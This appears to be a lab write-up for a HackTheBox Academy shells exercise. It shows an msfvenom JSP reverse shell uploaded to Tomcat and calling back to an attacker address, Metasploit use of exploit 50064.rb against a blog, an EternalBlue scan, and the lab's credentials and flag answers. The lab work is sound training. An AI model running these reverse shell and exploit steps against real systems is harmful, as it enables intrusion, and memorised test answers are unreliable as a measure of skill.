

<img src="/budahacksecurity/uploads/md_images/payload/sh.png" style="max-width:100%; border-radius:8px;">

---

## **Question 1**

**What is the hostname of Host-1?**
*(Format: all lowercase)*

```bash
xfreerdp /v:10.129.204.126 /u:htb-srudent /p:'HTB_@cademy_stdnt'
```

We connect via **RDP**.
After logging in, we notice a credentials file in `.txt` format. When opening it, we find **Tomcat credentials for Host-1**, since the image shows that **Host-1 is accessible via port 8080**.

<img src="/budahacksecurity/uploads/md_images/payload/sh1.png" style="max-width:100%; border-radius:8px;">

We generate a payload using `msfvenom`:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.131 LPORT=4444 -f war -o shell.war
```

Once the payload is created, we upload it to **Tomcat**, access the payload, and receive our reverse shell connection.

<img src="/budahacksecurity/uploads/md_images/payload/sh2.png" style="max-width:100%; border-radius:8px;">

We request the hostname and answer the first question:

```bash
hostname --> shells-winsvr
```

---

## **Question 2**

**Exploit the target and obtain a shell session. Submit the name of the folder located at `C:\Shares\`.**
*(Format: all lowercase)*

```bash
cd \
cd Shares
dev-share
```

---

## **Question 3**

**Which Linux distribution is running on Host-2?**
*(Format: distribution name, all lowercase)*

```bash
nmap -p- --open --min-rate 5000 -Pn -n -sSV blog.inlanefreight.local

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 00:50:56:B0:61:3C (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The answer is:

```
ubuntu
```

---

## **Question 4**

**In which language is the shell written that is loaded when using the exploit `50064.rb`?**

```
php
```

---

## **Question 5**

**Exploit the blog site and establish a shell session on the target operating system. Submit the contents of `/customscripts/flag.txt`.**

We log into the blog using the credentials found earlier in the `.txt` file:

```
admin
admin123!@#
```

<img src="/budahacksecurity/uploads/md_images/payload/sh3.png" style="max-width:100%; border-radius:8px;">

Once logged in, we can see references to vulnerability **50064.rb**.

We copy the exploit file:

```bash
cp /usr/share/exploitdb/exploits/php/webapps/50064.rb
```

We launch Metasploit:

```bash
msfconsole -q
reload_all
use exploit/50064.rb
options
```

<img src="/budahacksecurity/uploads/md_images/payload/sh4.png" style="max-width:100%; border-radius:8px;">

We retrieve the `flag.txt` file:

```bash
cat /customscripts/flag.txt

B1nD_Shells_r_cool
```

---

## **Question 6**

**What is the hostname of Host-3?**

```bash
nmap -F -A --min-rate 5000 -Pn -n -sS 172.16.1.13 -vvv
```

<img src="/budahacksecurity/uploads/md_images/payload/sh5.png" style="max-width:100%; border-radius:8px;">

---

## **Question 8**

**Exploit and obtain a shell session on Host-3. Then submit the contents of**
`C:\Users\Administrator\Desktop\Skills-flag.txt`

```bash
nmap -p445 --min-rate 5000 --scripts "vuln" -Pn -n -vvv 172.16.1.13
```
<img src="/budahacksecurity/uploads/md_images/payload/sh6.png" style="max-width:100%; border-radius:8px;">

We can see that **Host-3 is vulnerable to EternalBlue**.

<img src="/budahacksecurity/uploads/md_images/payload/sh7.png" style="max-width:100%; border-radius:8px;">

We retrieve the flag:

```bash
type C:\Users\Administrator\Desktop\Skills-flag.txt
```


